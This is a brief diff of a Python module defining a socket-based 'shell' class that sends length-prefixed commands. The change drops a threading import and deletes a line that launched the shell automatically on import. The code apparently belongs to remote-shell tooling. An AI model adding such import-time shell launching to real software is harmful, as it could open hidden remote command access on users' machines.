@@ -1,4 +1,4 @@
-import re,requests,threading,struct
+import re,requests,struct
 from socket import *
 
 __all__=['shell']
@@ -53,5 +53,3 @@ class shell:
         self.head2=struct.pack("I",len(self.cmd))
         self.send_data=self.head2+self.cmd
         self.s.send(self.send_data)
-
-shell().launcher()
